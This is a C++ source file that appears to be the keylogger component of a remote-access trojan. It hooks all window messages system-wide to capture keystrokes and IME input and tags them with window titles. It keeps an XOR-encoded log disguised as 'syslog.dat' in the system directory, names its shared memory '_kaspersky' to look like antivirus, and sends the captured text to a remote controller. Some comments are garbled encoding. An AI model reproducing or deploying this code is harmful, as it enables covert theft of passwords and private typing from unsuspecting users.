// MyKeyboardManager.cpp: implementation of the CMyKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "MyKeyboardManager.h"
#pragma comment(lib, "Imm32.lib")

bool g_bSignalHook = true;

HANDLE		CMyKeyboardManager::m_hMapping_File = NULL;
HINSTANCE	CMyKeyboardManager::g_hInstance = NULL;
DWORD		CMyKeyboardManager::m_dwLastMsgTime = GetTickCount();
TShared*	CMyKeyboardManager::m_pTShared = NULL;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyKeyboardManager::CMyKeyboardManager(CClientSocket *pClient) : CManager(pClient)
{
	g_bSignalHook = true;

	sendStartKeyBoard();
	WaitForDialogOpen();
	sendOfflineRecord();

	unsigned long	dwOffset = m_pTShared->dwOffset;

	while (m_pClient->IsRunning())
	{
		if (m_pTShared->dwOffset != (unsigned long)dwOffset)
		{
			UINT	nSize;
			if (m_pTShared->dwOffset < dwOffset)
				nSize = m_pTShared->dwOffset;
			else
				nSize = m_pTShared->dwOffset - dwOffset;

			sendKeyBoardData((unsigned char *)&(m_pTShared->chKeyBoard[dwOffset]), nSize);

			dwOffset = m_pTShared->dwOffset;
		}
		Sleep(300);
	}

	if (!m_pTShared->bIsOffline)
		g_bSignalHook = false;
}

void CMyKeyboardManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == COMMAND_NEXT)
		NotifyDialogIsOpen();

	if (lpBuffer[0] == COMMAND_KEYBOARD_OFFLINE)
	{
		m_pTShared->bIsOffline = !m_pTShared->bIsOffline;
		if (!m_pTShared->bIsOffline)
			DeleteFile(m_pTShared->strRecordFile);
		else if (GetFileAttributes(m_pTShared->strRecordFile) == -1)
		{
			HANDLE hFile = CreateFile(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
				CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			CloseHandle(hFile);
		}
	}
	if (lpBuffer[0] == COMMAND_KEYBOARD_CLEAR && m_pTShared->bIsOffline)
	{
		HANDLE hFile = CreateFile(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		CloseHandle(hFile);
	}
}

CMyKeyboardManager::~CMyKeyboardManager()
{
}

void CMyKeyboardManager::SaveToFile(char *lpBuffer)
{
	HANDLE	hFile = CreateFile(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	DWORD dwSize = GetFileSize(hFile, NULL);
	// ���߼�¼��С��50M
	if (dwSize < 1024 * 1024 * 50)
		SetFilePointer(hFile, 0, 0, FILE_END);

	// ����
	int	nLength = strlen(lpBuffer);
	LPBYTE	lpEncodeBuffer = new BYTE[nLength];
	for (int i = 0; i < nLength; i++)
		lpEncodeBuffer[i] = lpBuffer[i] ^ XOR_ENCODE_VALUE;
	WriteFile(hFile, lpEncodeBuffer, nLength, &dwBytesWrite, NULL);
	CloseHandle(hFile);

	delete	lpEncodeBuffer;
}

void CMyKeyboardManager::SaveInfo(char *lpBuffer)
{
	HINSTANCE user32 = GetModuleHandleW(L"user32.dll");

	typedef BOOL(WINAPI *GWTW)(HWND, LPSTR, int);
	GWTW myGetWindowText = (GWTW)GetProcAddress(user32, "GetWindowTextA");

	if (lpBuffer == NULL)
		return;

	DWORD	dwBytes = strlen(lpBuffer);

	if ((dwBytes < 1) || (dwBytes > SIZE_IMM_BUFFER)) return;

	HWND hWnd = GetActiveWindow();

	if (hWnd != m_pTShared->hActWnd)
	{
		m_pTShared->hActWnd = hWnd;
		char strCapText[256];
		myGetWindowText(m_pTShared->hActWnd, strCapText, sizeof(strCapText));

		char strSaveString[1024 * 2];
		SYSTEMTIME	SysTime;
		GetLocalTime(&SysTime);
		memset(strSaveString, 0, sizeof(strSaveString));
		wsprintfA(strSaveString,
			"\r\n[%02d/%02d/%d %02d:%02d:%02d] (%s)\r\n",
			SysTime.wMonth, SysTime.wDay, SysTime.wYear,
			SysTime.wHour, SysTime.wMinute, SysTime.wSecond,
			strCapText
		);

		OutputDebugStringA(strSaveString);
		// �ú���Ϊ��Ӧ�ñ����
		SaveInfo(strSaveString);
	}

	if (m_pTShared->bIsOffline)
	{
		SaveToFile(lpBuffer);
	}

	// reset
	if ((m_pTShared->dwOffset + dwBytes) > sizeof(m_pTShared->chKeyBoard))
	{
		memset(m_pTShared->chKeyBoard, 0, sizeof(m_pTShared->chKeyBoard));
		m_pTShared->dwOffset = 0;
	}
	strcat(m_pTShared->chKeyBoard, lpBuffer);
	m_pTShared->dwOffset += dwBytes;
}

LRESULT CALLBACK CMyKeyboardManager::GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	char	strChar[2];
	char	KeyName[20];

	HINSTANCE imm32 = GetModuleHandleW(L"imm32.dll");

	typedef HIMC(WINAPI *IGC)(HWND hWnd);
	IGC myImmGetContext = (IGC)GetProcAddress(imm32, "ImmGetContext");

	typedef LONG(WINAPI *IGCSA)(HIMC hIMC, DWORD dwIndex, LPVOID lpBuf, DWORD dwBufLen);
	IGCSA myImmGetCompositionString = (IGCSA)GetProcAddress(imm32, "ImmGetCompositionStringA");

	typedef BOOL(WINAPI *IRC)(HWND hWnd, HIMC hIMC);
	IRC myImmReleaseContext = (IRC)GetProcAddress(imm32, "ImmReleaseContext");

	LRESULT result = CallNextHookEx(m_pTShared->hGetMsgHook, nCode, wParam, lParam);

	MSG* pMsg = (MSG*)(lParam);
	// ��ֹ��Ϣ�ظ�������¼�ظ�����pMsg->time�ж�
	if (
		(nCode != HC_ACTION) ||
		((pMsg->message != WM_IME_COMPOSITION) && (pMsg->message != WM_CHAR)) ||
		(m_dwLastMsgTime == pMsg->time)
		)
	{
		return result;
	}

	m_dwLastMsgTime = pMsg->time;

	if ((pMsg->message == WM_IME_COMPOSITION) && (pMsg->lParam & GCS_RESULTSTR))
	{
		HWND	hWnd = pMsg->hwnd;
		HIMC	hImc = myImmGetContext(hWnd);

		LONG	strLen = myImmGetCompositionString(hImc, GCS_RESULTSTR, NULL, 0);
		// ���ǵ�UNICODE
		strLen += sizeof(WCHAR);
		ZeroMemory(m_pTShared->str, sizeof(m_pTShared->str));
		myImmGetCompositionString(hImc, GCS_RESULTSTR, m_pTShared->str, strLen);
		//		strLen =myNetReads(hImc, GCS_RESULTSTR, NULL, 0);

		//		myNetRead1(hWnd, hImc);

		myImmReleaseContext(hWnd, hImc);
		SaveInfo(m_pTShared->str);
	}

	if (pMsg->message == WM_CHAR)
	{
		if (pMsg->wParam <= 127 && pMsg->wParam >= 20)
		{
			strChar[0] = pMsg->wParam;
			strChar[1] = '\0';
			SaveInfo(strChar);
		}
		else if (pMsg->wParam == VK_RETURN)
		{
			SaveInfo("\r\n");
		}
		// �����ַ�
		else
		{
			memset(KeyName, 0, sizeof(KeyName));
			if (GetKeyNameTextA(pMsg->lParam, &(KeyName[1]), sizeof(KeyName) - 2) > 0)
			{
				KeyName[0] = '[';
				strcat(KeyName, "]");
				SaveInfo(KeyName);
			}
		}
	}

	return result;
}

bool CMyKeyboardManager::Initialization()
{
	CShareRestrictedSD ShareRestrictedSD;
	m_hMapping_File = CreateFileMapping((HANDLE)0xFFFFFFFF, ShareRestrictedSD.GetSA(), PAGE_READWRITE, 0, sizeof(TShared), _T("_kaspersky"));
	if (m_hMapping_File == NULL)
	{
		OutputDebugString(_T("m_hMapping_File == NULL"));
		return false;
	}
	// ע��m_pTShared���ܽ��������������Ϊ�����Ѿ�����, Ҫ��StartHook����в���
	m_pTShared = (TShared *)MapViewOfFile(m_hMapping_File, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, 0);

	if (m_pTShared == NULL)
		return false;

	return true;
}

bool CMyKeyboardManager::StartHook()
{
	if (!Initialization())
		return false;

	ZeroMemory(m_pTShared, sizeof(TShared));

	g_bSignalHook = true;

	m_dwLastMsgTime = GetTickCount();
	m_pTShared->hActWnd = NULL;
	m_pTShared->hGetMsgHook = NULL;
	m_pTShared->dwOffset = 0;

	ZeroMemory(m_pTShared->str, sizeof(m_pTShared->str));

	GetSystemDirectory(m_pTShared->strRecordFile, sizeof(m_pTShared->strRecordFile));
	lstrcat(m_pTShared->strRecordFile, _T("\\syslog.dat"));

	// �ļ����ڣ��Ϳ�ʼ���߼�¼����
	if (GetFileAttributes(m_pTShared->strRecordFile) != -1)
		m_pTShared->bIsOffline = true;
	else
		m_pTShared->bIsOffline = false;

	if (m_pTShared->hGetMsgHook == NULL)
	{
		m_pTShared->hGetMsgHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, g_hInstance, 0);
	}

	return true;
}

int CMyKeyboardManager::sendOfflineRecord()
{
	int		nRet = 0;
	DWORD	dwBytesRead = 0;
	TCHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, _T("\\syslog.dat"));

	HANDLE	hFile = CreateFile(strRecordFile, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwSize = GetFileSize(hFile, NULL);
		char *lpBuffer = new char[dwSize];
		ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL);
		// ����
		for (DWORD i = 0; i < dwSize; i++)
			lpBuffer[i] ^= XOR_ENCODE_VALUE;
		nRet = sendKeyBoardData((LPBYTE)lpBuffer, dwSize);

		delete lpBuffer;
	}

	CloseHandle(hFile);
	return nRet;
}

void CMyKeyboardManager::StopHook()
{
	if (m_pTShared->hGetMsgHook != NULL)
		UnhookWindowsHookEx(m_pTShared->hGetMsgHook);

	m_pTShared->hGetMsgHook = NULL;

	UnmapViewOfFile(m_pTShared);
	CloseHandle(m_hMapping_File);
	m_pTShared = NULL;
}

int CMyKeyboardManager::sendStartKeyBoard()
{
	BYTE	bToken[2];
	bToken[0] = TOKEN_KEYBOARD_START;
	bToken[1] = (BYTE)m_pTShared->bIsOffline;

	return Send((LPBYTE)&bToken[0], sizeof(bToken));
}

int CMyKeyboardManager::sendKeyBoardData(LPBYTE lpData, UINT nSize)
{
	DWORD dwBytesLength = 1 + nSize;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwBytesLength);
	lpBuffer[0] = TOKEN_KEYBOARD_DATA;
	memcpy(lpBuffer + 1, lpData, nSize);

	OutputDebugStringA((char*)lpBuffer);
	int nRet = Send((LPBYTE)lpBuffer, dwBytesLength);
	LocalFree(lpBuffer);
	return nRet;
}